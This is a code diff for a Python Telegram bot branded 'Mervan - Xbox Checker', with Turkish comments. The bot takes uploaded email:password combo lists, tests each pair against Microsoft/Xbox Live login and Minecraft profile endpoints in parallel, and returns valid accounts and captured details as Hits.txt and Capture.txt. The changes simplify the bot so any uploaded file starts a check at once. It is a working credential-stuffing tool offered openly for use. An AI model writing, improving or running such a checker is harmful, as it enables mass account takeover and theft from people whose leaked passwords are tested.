@@ -25,6 +25,9 @@ init(autoreset=True)
 urllib3.disable_warnings()
 warnings.filterwarnings("ignore")
 
+# Global çalışan kontrolleri takip etmek için sözlük
+running_checks = {}
+
 # ==================== SABİTLER ====================
 SFTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
 MAX_RETRIES = 2
@@ -67,8 +70,6 @@ def save_hit(folder, filename, content):
         pass
 
 def get_banner():
-    C = Fore.CYAN
-    B = Fore.BLUE
     W = Fore.WHITE
     return r"""
   ____  _     _____ _____ ____ ___ _   _  ____ 
@@ -77,9 +78,9 @@ def get_banner():
   ___) | |___| |___| |___|  __/| || |\  | |_| |
  |____/|_____|_____|_____|_|  |___|_| \_|\____|
 {W}      >>> Mervan - Xbox Checker | By Sleeping Drops | Mervan | https://discord.gg/QnDNWFaZBW<<<
-    """.format(C=Fore.CYAN, B=Fore.BLUE, W=Fore.WHITE)
+    """.format(W=Fore.WHITE)
 
-# ==================== KONTROL FONKSİYONLARI (ORİJİNAL) ====================
+# ==================== KONTROL FONKSİYONLARI ====================
 def get_sftag(session, max_attempts=MAX_RETRIES):
     for attempt in range(max_attempts):
         try:
@@ -259,7 +260,6 @@ def get_minecraft_profile(session, mc_token, max_attempts=MAX_RETRIES):
     return None
 
 def check_account(combo, stats, results_folder):
-    """Tek bir combo'yu kontrol eder, istatistikleri ve dosyaları günceller."""
     try:
         parts = combo.strip().split(':')
         if len(parts) < 2:
@@ -355,7 +355,6 @@ def check_account(combo, stats, results_folder):
 
 # ==================== BOT İSTATİSTİK PANOSU ====================
 def build_stats_panel(stats):
-    """İstatistikleri renkli panel metni olarak döndürür."""
     panel_content = r"""
 {G}      .zZz      
 {G}     z          {W}┌──────────────┬───────┐
@@ -377,9 +376,7 @@ def build_stats_panel(stats):
 
 # ==================== KONTROL İŞLEMİ (THREAD) ====================
 def run_checker(chat_id, combos, message_id, results_folder):
-    """Combo listesini kontrol eder, bot mesajını günceller, durdurma flag'ini kontrol eder."""
     stats = Stats()
-    stop_flag = running_checks.get(chat_id, {}).get('stop_flag', False)
     total = len(combos)
     checked_since_last_update = 0
 
@@ -387,14 +384,12 @@ def run_checker(chat_id, combos, message_id, results_folder):
         futures = {executor.submit(check_account, combo, stats, results_folder): combo for combo in combos}
 
         for future in concurrent.futures.as_completed(futures):
-            # Durdurma kontrolü
             if running_checks.get(chat_id, {}).get('stop_flag', False):
                 executor.shutdown(wait=False, cancel_futures=True)
                 break
 
             checked_since_last_update += 1
 
-            # Belirli aralıkta bot mesajını güncelle
             if checked_since_last_update >= UPDATE_INTERVAL or stats.checked >= total:
                 try:
                     panel = build_stats_panel(stats)
@@ -408,9 +403,8 @@ def run_checker(chat_id, combos, message_id, results_folder):
                     pass
                 checked_since_last_update = 0
 
-        # Tüm işlemler bitti veya durduruldu
-        # Son durumu güncelle
         try:
+            stop_flag = running_checks.get(chat_id, {}).get('stop_flag', False)
             panel = build_stats_panel(stats)
             bot.edit_message_text(
                 chat_id=chat_id,
@@ -421,13 +415,10 @@ def run_checker(chat_id, combos, message_id, results_folder):
         except Exception:
             pass
 
-    # İşlem bitti, sonuçları gönder
     send_results(chat_id, results_folder, stats)
 
 # ==================== SONUÇLARI GÖNDER ====================
 def send_results(chat_id, folder, stats):
-    """Sonuç dosyalarını ve özet mesajını gönderir."""
-    # Özet mesajı
     summary = (
         f"📊 **Kontrol Tamamlandı**\n"
         f"├ Kontrol edilen: {stats.checked}\n"
@@ -441,7 +432,6 @@ def send_results(chat_id, folder, stats):
     )
     bot.send_message(chat_id, summary, parse_mode='Markdown')
 
-    # Dosyaları gönder
     files_to_send = [
         ("Hits.txt", "Hits.txt"),
         ("Capture.txt", "Capture.txt"),
@@ -467,37 +457,15 @@ def start_command(message):
         message,
         "🤖 **Mervan Xbox Checker Bot**\n\n"
         "Kullanım:\n"
-        "1. `/check` komutu ile bir combo dosyası (email:pass) gönderin.\n"
-        "2. Bot kontrolü başlatacak ve canlı istatistikleri gösterecek.\n"
-        "3. `/stop` ile kontrolü durdurabilirsiniz.\n\n"
-        "💡 Dosya uzantısı `.txt` olmalı ve her satırda `email:password` formatında olmalıdır.",
+        "Doğrudan bir combo dosyası (email:pass içeren .txt) gönderin. Bot anında kontrolü başlatacaktır.\n"
+        "Kontrolü durdurmak için `/stop` komutunu kullanabilirsiniz.",
         parse_mode='Markdown'
     )
-
-@bot.message_handler(commands=['check'])
-def check_command(message):
-    chat_id = message.chat.id
-    # Eğer zaten bir kontrol çalışıyorsa uyar
-    if chat_id in running_checks and running_checks[chat_id].get('running', False):
-        bot.reply_to(message, "⏳ Zaten bir kontrol çalışıyor! Lütfen önce `/stop` ile durdurun.")
-        return
-
-    bot.reply_to(
-        message,
-        "📤 Lütfen kontrol edilecek combo listesini içeren bir **.txt** dosyası gönderin.",
-        parse_mode='Markdown'
-    )
-    # Dosya beklediğimizi işaretle
-    # Bunu için bir sonraki mesajda belge kontrolü yapacağız
-    # Geçici olarak beklenen dosya flag'i koyalım
-    # Basitçe, bot.register_next_step_handler ile yapabiliriz.
-    # Ama daha kolayı: dosya mesajını yakalayıp işleme alalım.
 
 @bot.message_handler(content_types=['document'])
 def handle_document(message):
     chat_id = message.chat.id
-    # Sadece komutla dosya istendiğinde işle, yoksa uyar
-    # Basitçe eğer çalışan kontrol yoksa ve dosya varsa başlat
+    
     if chat_id in running_checks and running_checks[chat_id].get('running', False):
         bot.reply_to(message, "⏳ Zaten bir kontrol çalışıyor! Önce `/stop` ile durdurun.")
         return
@@ -507,7 +475,6 @@ def handle_document(message):
         bot.reply_to(message, "❌ Lütfen **.txt** uzantılı bir dosya gönderin.")
         return
 
-    # Dosyayı indir
     downloaded_file = bot.download_file(file_info.file_path)
     try:
         content = downloaded_file.decode('utf-8', errors='ignore')
@@ -520,26 +487,19 @@ def handle_document(message):
         bot.reply_to(message, "❌ Geçerli combo bulunamadı (email:password formatında olmalı).")
         return
 
-    # Başlangıç mesajı
-    init_msg = bot.reply_to(message, "⏳ Kontrol başlatılıyor...")
-
-    # Results klasörü
+    init_msg = bot.reply_to(message, "⏳ Combo algılandı, kontrol başlatılıyor...")
     folder = create_results_folder(chat_id)
 
-    # Çalışan kontroller listesine ekle
-    stop_flag = False
     running_checks[chat_id] = {
         'running': True,
-        'stop_flag': stop_flag,
+        'stop_flag': False,
         'thread': None,
         'message_id': init_msg.message_id,
         'folder': folder
     }
 
-    # Kontrolü ayrı thread'de başlat
     def target():
         run_checker(chat_id, combos, init_msg.message_id, folder)
-        # İşlem bittiğinde running'i False yap
         if chat_id in running_checks:
             running_checks[chat_id]['running'] = False
 
@@ -554,29 +514,23 @@ def stop_command(message):
         bot.reply_to(message, "❌ Aktif bir kontrol bulunamadı.")
         return
 
-    # Durdurma flag'ini işaretle
     running_checks[chat_id]['stop_flag'] = True
     bot.reply_to(message, "⏹️ Kontrol durduruluyor... Lütfen bekleyin.")
-
-    # Thread'in bitmesini bekleme (isteğe bağlı)
-    # Botun yanıt vermesi için beklemeyiz.
 
 @bot.message_handler(commands=['help'])
 def help_command(message):
     bot.reply_to(
         message,
         "📖 **Yardım**\n\n"
-        "/start - Botu başlat\n"
-        "/check - Combo dosyası göndermek için hazırlan\n"
-        "/stop - Çalışan kontrolü durdur\n"
-        "/help - Bu mesajı göster",
+        "Dosya Gönder -> Doğrudan combo kontrolünü başlatır.\n"
+        "/stop -> Çalışan kontrolü durdurur.",
         parse_mode='Markdown'
     )
 
 # ==================== BOTU BAŞLAT ====================
 if __name__ == '__main__':
-    # results ana klasörünü oluştur
     os.makedirs("results", exist_ok=True)
     print(get_banner())
     print("[+] Bot başlatılıyor...")
     bot.polling(none_stop=True)
+
